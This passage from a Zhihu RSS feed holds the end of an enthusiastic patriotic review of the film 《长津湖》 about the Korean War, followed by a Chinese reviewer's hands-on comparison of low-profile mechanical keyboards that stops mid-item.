饰）明明已经退伍，可以告别枪林弹雨的战争和流血，在上海过上惬意自在的生活，却在志愿军队伍出发前，狂蹬了十几个小时自行车归队了。</p>\n<p>指导员梅生是连队里唯一的文化人，当然不是天生好战，如果没有战争，他可能会过上书香生活，与深爱着的妻子和女儿一起其乐融融，但是为了保卫祖国，为了家人和同胞来之不易的安宁，他不惧怕任何流血牺牲、义无反顾！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fb76a49591b03bd42e9a8b237d9cff2a_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"508\" data-rawheight=\"259\" data-watermark=\"watermark\" data-original-src=\"v2-fb76a49591b03bd42e9a8b237d9cff2a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>不得不说，这部影片成功反映了我军最真实的政工干部形象：儒雅而有血性。纠正了以往一些影片故意边缘化政工干部的偏差，是为政工干部的一次正名：他们平时可以团聚凝聚官兵、与大家打成一片；上了战场就是一名充满智慧、打得了硬仗、不惧流血牺牲的勇士。</p>\n<p>——因为渐渐懂得这个崇高的使命，伍万里从调皮捣蛋的乡村少年，到远走他乡，跟随部队参军入伍！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2a4de387ae5b10714761446cd7a1eeb1_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1070\" data-rawheight=\"564\" data-watermark=\"watermark\" data-original-src=\"v2-2a4de387ae5b10714761446cd7a1eeb1\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>伍万里（易烊千玺饰）是个十足的新兵蛋子，刚加入队伍时显得极度不适，第一次听到信号弹的声音都会被吓一大跳、在车厢里被大伙调教逗乐而想逃跑、同伴牺牲让他痛苦万分……</p>\n<p>在雷公、连长和战友们的帮助下，在艰苦的战斗中磨砺，他成长得很快，与敌人近距离搏杀，在战场上冲锋陷阵。他从一个喜欢打水漂的野孩子成长为投弹精准的一线战士，不但认清了战争的残酷本质，而且还读懂了军人的信念，长出了七连的骨头！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-32d868a64d6f7052a42705348bdaba32_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"480\" data-rawheight=\"243\" data-watermark=\"watermark\" data-original-src=\"v2-32d868a64d6f7052a42705348bdaba32\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>最可贵的就是成长。</p>\n<p>——因为肩负这个崇高的使命，真实的志愿军将士们不畏艰难困苦，英勇顽强、舍生忘死，抛头颅、洒热血，甘愿为祖国和人民牺牲一切，只为了最后的胜利。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e7f095f00c17a43d060532eb56c1eda7_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"805\" data-rawheight=\"733\" data-watermark=\"watermark\" data-original-src=\"v2-e7f095f00c17a43d060532eb56c1eda7\" data-watermark-src=\"v2-7803064cfd6a8743e99d77ad8a96e103\" data-private-watermark-src=\"v2-091bee1b28a733663cea94400ec7bea5\"></p>\n<p>犹如影片中指导员梅生的一番话：</p>\n<p><b>「我女儿问我，为什么我要去打仗？这场仗我们不打，就是我们的下一代要打。我们出生入死，就是为了让他们不打仗。」</b></p>\n<p>时至今日，还会有人在怀疑抗美援朝！这场伟大的战争到底值不值？这么惨烈的牺牲，有必要么？曾经有个别公知大V公然叫嚣：假如没有抗美援朝，我们照样不是过着安稳的日子？</p>\n<p><img src=\"https://pic1.zhimg.com/v2-62931bfe71bfc1015025ae59415afd0b_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"279\" data-watermark=\"watermark\" data-original-src=\"v2-62931bfe71bfc1015025ae59415afd0b\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>真的是这样吗？我们生活在这个怀疑的时代，需要怀疑的精神！可是有点历史常识的人，就会注意到如下细节——</p>\n<p>1950年6月27日，美军第七舰队驶入台湾海峡，公然干涉中国内政。8月27日，美军战机5批13架次，侵入中国东北境内的辑安（今集安）、临江、安东（今丹东）地区上空轰炸扫射，炸死中国居民3人，炸伤21人。两天之后的8月29日，美国空军飞机又两次入侵中国宽甸县上空进行侦察扫射，杀死中国居民4人，杀伤7人。</p>\n<p>当我们的同胞被杀，当国家主权被侵略、被践踏，当战火烧到我们的家门口！<b>试问，任何一个有良知的中国人能坐视不管么？！试问，我们除了拿起武器保家卫国，我们还能选择做什么？！</b></p>\n<p>正如歌曲《我的祖国》唱得那样：<b>「朋友来了有好酒，若是那豺狼来了，迎接它的有猎枪……」</b></p>\n<p>影片中有这么一个细节：在万里刚入伍的列车上，因为不满哥哥千里的严格要求，万里闹别扭“不干了”，拉开列车门，眼前出现的却是在巍峨群山中盘桓的长城，这一幕让战士们深受震撼，也点出了抗美援朝的意义所在——</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4460729925acdc9e4d4caf9bad081f10_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"450\" data-watermark=\"watermark\" data-original-src=\"v2-4460729925acdc9e4d4caf9bad081f10\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>万里长城永不倒。</b>在中国军人的身后，是祖国的大好河山，是浴血奋战换来的和平生活，中国军人要永远做那个护卫祖国和人民的钢铁长城！</p>\n<p><b>「打得一拳开，免得百拳来。」</b>虽然新中国刚刚成立，和平来之不易，但为了后代的国泰民安，这是必须作出的战略决策。领导人的反复考量与果断决策，真实反映了历史史实。</p>\n<p>是的，《长津湖》在这些史实细节上处理上颇具匠心。</p>\n<p>有人说，《长津湖》对外军部分的刻画略显刻板，还有人说画面上有人海战术……客观上说，是存有一些瑕疵，但剑客想说，这瑕不掩瑜，这绝不是我们关注的重点。</p>\n<p>因为，在处理电影艺术和历史背景融合的取舍——三位导演既要交代明白历史背景又要使电影具有观赏性，增强历史纵深感，能够使我们更快速进入电影叙事之中，这有难度且并不容易。<b>有一些艺术加工和画面展现，完全可以理解。</b></p>\n<p><b>重要的是，志愿军将士们已通过他们的英勇战斗，让美军认识到这是一支战术素养极高、战斗意志极其顽强的队伍。所以，那些钻牛角尖式的讨论，毫无意义。</b></p>\n<p>重要的是，我们能够通过影片获得什么，<b>感知那个时代为了祖国和人民舍身取义、毅然决然英勇赴死的英雄，感知他们身上闪烁的精神品质，感知我们如今幸福生活的来之不易！</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-94c006a2e537f534b06fc7e9a174d954_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"255\" data-watermark=\"watermark\" data-original-src=\"v2-94c006a2e537f534b06fc7e9a174d954\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>通过电影的铺陈，使我们渐渐明白——敌我双方的军备武器悬殊，岂止天壤之别。对手异常地强大、战斗异常地艰苦。</p>\n<p>以美军陆战1师为首的联合国军，是美国海军陆战队中资历最老、规模最大的两栖步兵师，在长津湖战役之前，未尝败绩。他们的战机、坦克、导弹一应俱全，他们开着战机在天空中肆意飞行。我军没有制空权，白天隐秘，晚上行军，时刻面临着敌机轰炸的巨大危险。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c58231d2fa7fba2cbb718344df6763a5_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"609\" data-watermark=\"watermark\" data-original-src=\"v2-c58231d2fa7fba2cbb718344df6763a5\" data-watermark-src=\"v2-f15d645e1ecbc69a2183b75fe06f2649\" data-private-watermark-src=\"v2-4652bb52da85bcc5257d21a493285cc7\"></p>\n<p>影片中，有一幕对比让人印象深刻：零下三十度的冰天雪地里，中方志愿军埋伏在冰冷的石头堆里，每天每人只有一个硬得像石头的土豆充饥。而美军则在营地里穿着棉大衣，吃着大鱼大肉，听圣诞歌曲，闲聊着要怎样回家过节。</p>\n<p>然而一到了战场上就是另一副场景，志愿军将士与敌人以命相拼，用钢枪和生命铸就的铁血荣光，这是媒体曾经的战斗描述：</p>\n<p><b>「有的刺刀折断了，就抱住敌人摔打，用拳头、用牙齿，直到拉响身上的手榴弹；有的被燃烧弹击中，两条胳膊像铁钳一样箍住敌人身体，直到烧成焦炭与敌人同归于尽……」</b></p>\n<p>前沿阵地上，经常是以伤残严重的连对抗敌军齐装满员的团，几乎没有炮火支援，弹药常常补充不上；一桶水、一箱弹药、一个苹果常常要牺牲好几条人命还不一定送得上去，在这种情况下取得的胜利，中国军人用生命创造了一个又一个奇迹。</p>\n<p><b>这就是伟大的抗美援朝精神！</b></p>\n<p>这就是：祖国和人民利益高于一切、为了祖国和民族的尊严而奋不顾身的爱国主义精神，英勇顽强、舍生忘死的革命英雄主义精神，不畏艰难困苦、始终保持高昂士气的革命乐观主义精神，为完成祖国和人民赋予的使命、慷慨奉献自己一切的革命忠诚精神，以及为了人类和平与正义事业而奋斗的国际主义精神。</p>\n<p>就是这群穿着单衣、却拥有这个世界上<b>最坚强意志</b>的志愿军将士们，在武器装备极其不对称的条件下，让不可一世的美军节节溃退，用钢少气多的惊人意志打下了抗美援朝这场立国、立威之战。</p>\n<p>这是美国人永远不懂的数字对比，却是中国人最深刻懂得的数字意蕴。对于兰晓龙的宇宙粉丝来说，七连也许正是钢七连的前身，因为这个数字吻合上了：</p>\n<p>雷公是第17，伍百里161，伍千里是162，伍万里677……</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6a3f8d5618e648ae26c53d6932d45457_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"480\" data-rawheight=\"268\" data-watermark=\"watermark\" data-original-src=\"v2-6a3f8d5618e648ae26c53d6932d45457\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>这个计数在《士兵突击》中也曾出现，许三多入伍的时候，他是钢七连第4956名新兵。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c76461fd6c523eb7fd5bb833e9b17dd8_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"585\" data-watermark=\"watermark\" data-original-src=\"v2-c76461fd6c523eb7fd5bb833e9b17dd8\" data-watermark-src=\"v2-37f4a3c864c0b4f0f10bf7d23d7d063f\" data-private-watermark-src=\"v2-8622095c3a216e421b3b09f397a0ac12\"></p>\n<p>从抗美援朝到和平年代，七连依然在延续，数字在增加，精神血脉在传承。</p>\n<p>是的，在中国军人的战斗哲学中，数字，绝不是数字本身。</p>\n<p>今天，让我们记住国家档案馆统计的一组数字：<b>197653</b>名志愿军烈士永远长眠在异国他乡！197653不仅仅是数字，更是一个个<b>鲜活的面孔</b>，一座座<b>中国军人的永恒丰碑</b>。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a39ca65e15809ec658ed726c491c069c_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"853\" data-watermark=\"watermark\" data-original-src=\"v2-a39ca65e15809ec658ed726c491c069c\" data-watermark-src=\"v2-ac2ae65b073ea9fee169b7bab533f609\" data-private-watermark-src=\"v2-2d370fe9bb9e1c50ab38afff8bdde794\"></p>\n<p>看完电影，我的内心久久难以平静，我想用魏巍的课文《谁是最可爱的人》最后的结尾送给亲爱的朋友们——</p>\n<p>「亲爱的朋友们，当你坐上早晨第一列电车驰向工厂的时候，当你扛上犁耙走向田野的时候，当你喝完一杯豆浆、提着书包走向学校的时候，当你坐到办公桌前开始这一天工作的时候，当你往孩子口里塞苹果的时候，当你和爱人一起散步的时候……</p>\n<p>朋友，你是否意识到你是在幸福之中呢？你也许很惊讶地说：这是很平常的呀！</p>\n<p>可是，从朝鲜归来的人，会知道你正生活在幸福中。</p>\n<p>请你意识到这是一种<b>幸福</b>吧，因为只有你意识到这一点，<b>你才能更深刻了解我们的战士在朝鲜奋不顾身的原因</b>。」</p>\n<p>致敬，向所有的英烈！</p>\n<p>致敬，向最可爱的人！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-378018133dcfcb91136e8a77b1e0419f_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-watermark=\"watermark\" data-original-src=\"v2-378018133dcfcb91136e8a77b1e0419f\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>▲新时代戍边官兵</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/san-jian-ke-52-28?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">三剑客</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/488769477/answer/2156921582?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">981 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/490333985?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">电影《长津湖》最大的遗憾是什么？</a><br><a href=\"http://www.zhihu.com/question/488992270?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2021 国庆档电影《长津湖》？</a><br>\n","link":"http://www.zhihu.com/question/488769477/answer/2156921582?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"有哪些好用的键盘值得推荐？","date":"2021-10-06 16:50:45","description":"\n<p>各位好，我是 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/46a389fe3d4368fd1371ec3069be1267\" data-hash=\"46a389fe3d4368fd1371ec3069be1267\" data-hovercard=\"p$b$46a389fe3d4368fd1371ec3069be1267\">@Domino</a>。</p>\n<p>非常荣幸参加知乎的翻牌众测活动。</p>\n<p>每个人对“好用”这个词的定义都是不一样的。</p>\n<p>我遇到过太多这样的朋友：看了我的文章，最后买了某机械键盘。但是收到后，发现键盘太高了，手腕抬着难受。又或者用惯了笔记本键盘，到手后发现常规的机械键盘键程太长，按起来太费劲。</p>\n<p>对这部分用户来说，常规的机械键盘是不好用的。我认为可以考虑“矮轴”机械键盘。</p>\n<p><br></p>\n<p>“矮轴”顾名思义就是比常规轴要“矮”的轴体。以cherry轴举例，常规轴体高度为18.5MM，但是cherry的矮轴仅为11.9MM</p>\n<p><img src=\"https://pic1.zhimg.com/v2-452130033276af3840d82bd7892d4cf7_720w.jpg?rss\" data-rawwidth=\"561\" data-rawheight=\"367\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-452130033276af3840d82bd7892d4cf7\" data-watermark-src=\"v2-05cc91cd85bf4fb064a5caf917123e0b\" data-private-watermark-src=\"\"></p>\n<p>如果在键盘上更直观的展示，就是这个样子的：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d60e9f949bf81f8764f3d8f7c513f2aa_720w.jpg?rss\" data-rawwidth=\"693\" data-rawheight=\"434\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d60e9f949bf81f8764f3d8f7c513f2aa\" data-watermark-src=\"v2-d7bbc08282bfdf14225708c212159850\" data-private-watermark-src=\"\"></p>\n<h2>为了可以知道哪些矮轴键盘好用，我把常见品牌的矮轴键盘全部都买了回来，型号如下：</h2>\n<ul>\n<li>keychron/京造 K3：茶轴，佳达隆矮轴（十字轴心）</li>\n<li>keychron/京造 K1：青轴，佳达隆矮轴（直插轴心）</li>\n<li>达尔优EK868：茶轴，凯华矮轴（直插带钩轴心）</li>\n<li>RK速写96：茶轴，凯华矮轴（直插轴心）</li>\n<li>ikbc S200：青轴，TTC矮轴（十字轴心）</li>\n<li>ikbc S300：茶轴，TTC矮轴（十字轴心）</li>\n<li>酷冷至尊SK621：红轴，Cherry矮轴（十字轴心）</li>\n<li>雷神璃月 KC3094：红轴，高特矮轴（十字轴心）</li>\n</ul>\n<blockquote>同品牌相同设计不同配列的键盘没有购入，如达尔优EK869</blockquote>\n<p><img src=\"https://pic1.zhimg.com/v2-fec72247653a40c25f81f98486cba66c_720w.jpg?rss\" data-rawwidth=\"4000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-fec72247653a40c25f81f98486cba66c\" data-watermark-src=\"v2-d3bc986b42b0204913e8e115c765617b\" data-private-watermark-src=\"v2-c032b857d1f6a0b4889a014c570fb907\"></p>\n<h2><b>依旧把结论放在最上面。</b></h2>\n<p><b>只使用win电脑的用户：</b></p>\n<p>推荐在 <b>雷神璃月KC3094，京造K3、京造K1、ikbc S200、ikbc S300 </b>之间选购。</p>\n<blockquote>这几个之间的挑选建议主要参考下图中的配列和价格，其次是看下文中的使用体验。</blockquote>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429122230337380352\"></a><a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429122428383879168\"></a><a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429122317494947840\"></a><a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429122491294248960\"></a><a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429122532918554624\"></a><p><b>只使用mac电脑的用户：</b></p>\n<p>推荐在 <b>京造K3、京造K1、达尔优EK868 </b>之间选购</p>\n<blockquote>这几个之间的挑选建议主要参考下图中的配列和价格，其次是看下文中的使用体验。K1不太推荐青轴。</blockquote>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429122125320368128\"></a><p><br></p>\n<p><b>win与mac都要使用的用户：</b></p>\n<p>推荐在 京造K3、京造K1 之间选购，如果在WIN下不使用多媒体按键，还可以加上达尔优EK868。</p>\n<blockquote>这几个之间的挑选建议主要参考下图中的配列和价格，其次是看下文中的使用体验。K1不太推荐青轴。</blockquote>\n<p><br></p>\n<h2>所有的键盘配置信息与注意事项如下：</h2>\n<p><img src=\"https://pic3.zhimg.com/v2-e6b23105e5fcebc4c8678ecdfa7eb828_720w.jpg?rss\" data-rawwidth=\"1644\" data-rawheight=\"1154\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e6b23105e5fcebc4c8678ecdfa7eb828\" data-watermark-src=\"v2-7066277aff44d0cb4f603875c96bb0fe\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>使用方面分为两部分，轴体手感和键盘使用体验。</p>\n<h2>先说轴体。</h2>\n<p>所有的矮轴机械键盘的手感和薄膜、笔记本键盘的手感完全不一样。我认为绝对可以提升使用体验。</p>\n<p>矮轴的键程均比常规轴体要短，但是触发键程并不会比常规轴体短。</p>\n<p>从常规键盘切换到矮轴键盘我大概适应了两个小时左右，刚开始不习惯键程，会按的比较用力，会有较大的触底声，且指尖会累。但是习惯键程之后就OK了。</p>\n<p>本次涵盖了市面上大部分厂商的矮轴。</p>\n<p>矮<b>红轴</b>手感除了cherry的键程长一点之外，其他都相差不大。矮茶轴和矮青轴的手感却都不太一致。</p>\n<p><br></p>\n<p><b>茶轴：</b></p>\n<p>共同点就是段落都靠上，比较类似常规提前段落轴的手感。</p>\n<p>TTC的茶轴段落感最顺畅，最靠上。按下之后回弹有力。</p>\n<p>凯华矮轴（直插带钩）和佳达隆（十字轴心）相比较TTC矮茶轴段落感稍弱，这个段落比较像常规的茶轴。</p>\n<p>凯华矮轴（直插不带钩）最不像茶轴，初次上手我甚至以为是红轴。段落感仔细感受才能摸得到。</p>\n<p><b>青轴：</b></p>\n<p>所有的矮青轴的手感都比较像凯华的BOX白轴。</p>\n<p>TTC的矮青轴，各方面都和BOX白轴非常接近。第一次使用甚至以为就是BOX白轴。</p>\n<p>佳达隆（直插轴心）的矮青轴段落清晰，但是不管按下还是回弹，段落都非常生硬。且段落感比较靠前，初次使用很不习惯。按到键帽边缘的时候，会出现卡键的现象。（只有佳达隆的青轴有这个现象）</p>\n<p>凯华的矮白轴（青轴）段落确认感最弱，并且段落感在这三个轴里最靠下。</p>\n<p>凯华的矮白轴（青轴）是我认为最适合长久使用的青轴。不吵不闹也可以体验到“爽”的感觉。</p>\n<p>TTC的矮青轴次之，非常接近BOX白轴。如果不怕吵，TTC的矮青轴应该更适合你。</p>\n<p>佳达隆的青轴在比较之下显得比较廉价。我可能更多的会选择佳达隆的矮红轴、矮茶轴。</p>\n<blockquote>需要注意的是，矮轴的键帽（整套）并不能和常规轴体的通用，除非是厂商出配套键帽，否则将没有可替换的键帽。</blockquote>\n<p><br></p>\n<h2>键盘使用体验方面</h2>\n<blockquote><i>这几把键盘每把至少体验了一整天的时间，以下均在蓝牙模式下进行使用测试。（ikbc s200除外）</i></blockquote>\n<p>在这几天的正常使用中，我基本上每天除了码字就是打LOL的无限火力。我的笔记本电脑用支架架在桌子上，键盘在蓝牙模式下使用时距离电脑约40cm左右。</p>\n<p>这几把键盘在我的使用环境下均没有出现按键连击与按键延迟，多设备之间的切换也都很稳定，这点我都给好评。</p>\n<blockquote>请注意，目前市面上所有的蓝牙多少都还会出现连击或延迟，这与用户的使用环境有很大关系，以上内容均是在我的使用环境下得出的结论，仅供参考。</blockquote>\n<p>以下使用体验均是使用当天码字完成，软硬件参数方面可能没有写完整，<b>建议以之前表格为准</b>。</p>\n<h2>\n<br>keychron/京造 K3和keychron/京造 K1</h2>\n<p><img src=\"https://pic2.zhimg.com/v2-4e1e40d342c5fa2859000b6ef5d2a7c5_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4e1e40d342c5fa2859000b6ef5d2a7c5\" data-watermark-src=\"v2-ac8e599ebb3e4a1b88c6c789b411a427\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6ebd1daf8f4247bec0b8f5f92f40aca0_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-6ebd1daf8f4247bec0b8f5f92f40aca0\" data-watermark-src=\"v2-0bcb6c00e4838a5a70c9c29ba28324b2\" data-private-watermark-src=\"\"></p>\n<p>这两把放在一起说。功能方面两把键盘基本一致，支持蓝牙有线双模，支持MAC/WIN配列的快速切换。</p>\n<p>多媒体按键方面， mac下可以直接按F区进行调节，win下需要使用FN组合键的形式。</p>\n<p><b>功能方便我稍微不能理解的是，K3蓝牙模式下支持全键无冲，但是K1只支持五键无冲。</b></p>\n<p>使用体验方面，在不打开K3脚撑的情况下，K1和K3两把键盘的高度与倾斜角度基本一致。打字使用体验上来说也基本相差不大。</p>\n<p>这两把键盘按键与按键之前的缝隙比较大，实际测量和常规机械键盘按键中心距离并无差距。均为19mm左右。</p>\n<blockquote><i>一般机械键盘相邻按键中心间距为19.05mm</i></blockquote>\n<p>需要注意的是，K3有二段式脚撑，K1无脚撑。如果不考虑配列，我会选择K3。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7984b3084c873c8e55000fbb86872529_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7984b3084c873c8e55000fbb86872529\" data-watermark-src=\"v2-9ee6ab9cc2f42d1c05192a40b4fda8cf\" data-private-watermark-src=\"\"></p>\n<h2>达尔优EK868</h2>\n<p><img src=\"https://pic4.zhimg.com/v2-b1e261699a04d2043b1d601bed2260c4_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b1e261699a04d2043b1d601bed2260c4\" data-watermark-src=\"v2-0ed328fc070c6c69bd5f80e978d3558d\" data-private-watermark-src=\"\"></p>\n<p>键盘底部印有快速操作指南，并且所有连接操作并没有使用常规键盘的按键切换，而是使用四段式开关进行切换。，方便连接蓝牙，非常好评。</p>\n<p>脚撑是磁吸式的，可以拔出来旋转90度进行键盘高度的调节。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-227ea5d85164358ddb6f6d864aae586a_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-227ea5d85164358ddb6f6d864aae586a\" data-watermark-src=\"v2-a67fc260fa117fc336704cbe0eaa2ef6\" data-private-watermark-src=\"\"></p>\n<p>空格左边是四个按键，ctrl为1.5U，alt、WIN等按键均为1U，相比较常规配列的键盘较<b>容易误触</b>。</p>\n<p>且这个情况下，空格相较常规键盘往右移了0.75U。我玩LOL的时候，左手大拇指一般在C的下方，在这个键盘上，拇指会在空格的边缘上，略有不适。</p>\n<p>功能方面，支持win与mac配列的快速切换按钮。支持mac下常规的多媒体按键，不支持win下的任何多媒体按键。</p>\n<h2>RK速写96</h2>\n<p><img src=\"https://pic4.zhimg.com/v2-31cd2e492cbbc905d4e2260519755e35_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-31cd2e492cbbc905d4e2260519755e35\" data-watermark-src=\"v2-9a5b77dd5fe4819b36bb5fa017e4f620\" data-private-watermark-src=\"\"></p>\n<p>功能方面建议<b>参考之前表格</b>。</p>\n<p>这把键盘是这些键盘里整体观感质感最不好的一个。</p>\n<p>键盘正面全是按键，这个时候键帽选择的好不好很大程度上影响了观感。在白天背光打开的情况下，键帽字符可以看到非常明显的字符分界。并且不太能看清字符。在暗光环境下，这个情况会好很多。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1960152901f2640746ce4f3e445f7226_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-1960152901f2640746ce4f3e445f7226\" data-watermark-src=\"v2-eec8a0d1fd0cafd89747318bfd5d6243\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d5d46cdb54a9811531f1f9a1f98a4a2f_720w.jpg?rss\" data-rawwidth=\"4588\" data-rawheight=\"3058\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d5d46cdb54a9811531f1f9a1f98a4a2f\" data-watermark-src=\"v2-ce6bb4ae55a9cf594943f76c8aec0863\" data-private-watermark-src=\"\"></p>\n<p>使用方面，RK速写96我适应了比较久，应该是这几把键盘里适应时间最长的。首先是键帽问题，距离太近了，按的时候稍微偏一点就非常容易按错。</p>\n<h2>ikbc s200和ikbc s300</h2>\n<p><img src=\"https://pic2.zhimg.com/v2-1af6c49e398c84e868e1f1cb36f918b4_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-1af6c49e398c84e868e1f1cb36f918b4\" data-watermark-src=\"v2-f0a5ad236e3380f766ae79bd17cc44e1\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0c33196d61563b7f79407a7f87783ead_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0c33196d61563b7f79407a7f87783ead\" data-watermark-src=\"v2-a0a493f7af51e020b2e89ddcdd8a1354\" data-private-watermark-src=\"\"></p>\n<p>S200我买的2.4G单模版本，他还有蓝牙2.4G双模版本。S300为蓝牙2.4G双模。</p>\n<p>这俩键盘都是电池供电的，无背光。</p>\n<p>键帽均使用的是PBT键帽，是矮轴键盘里唯二使用PBT键帽的键盘。如果买来是为了使用，推荐S200，如果买来为了颜值，推荐S300。</p>\n<p>S200和S300就目前的键帽来说完全是两个使用体验。S200用起来就是一把非常好用的键盘，甚至都没有上手成本。用的非常舒服。</p>\n<p>S200我之前有过测评，详细测评请移步：</p>\n<p><br></p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://zhuanlan.zhihu.com/p/256413536\" data-size=\"small\" data-image=\"https://pic2.zhimg.com/v2-2c98dc15d6c8ea293a10eb0dce4cf940_r.jpg\" data-entity-type=\"article\" class=\"internal\">400元以下机械键盘——横评及选购指南（2021.08.08更新）</a><p>S300的键帽是圆点类型的，用起来会稍微有点累，需要适应一段时间。</p>\n<p>再说回颜值，这次我全部的键盘拿出来后，女友就只对S300感兴趣。奶白色是真的很漂亮。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-393d701b9a662f68d966dc4aba3b067e_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-393d701b9a662f68d966dc4aba3b067e\" data-watermark-src=\"v2-bf80923601aa75b0f07ad9a8a99e54c4\" data-private-watermark-src=\"\"></p>\n<h2>酷冷至尊SK621</h2>\n<p><img src=\"https://pic1.zhimg.com/v2-648e25ed02e3a50cf0901e7cdc6be95f_720w.jpg?rss\" data-rawwidth=\"6000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-648e25ed02e3a50cf0901e7cdc6be95f\" data-watermark-src=\"v2-4b3d2932007b43e6558db6d27a5c9937\" data-private-watermark-src=\"\" data-qrcode-action=\"none\" 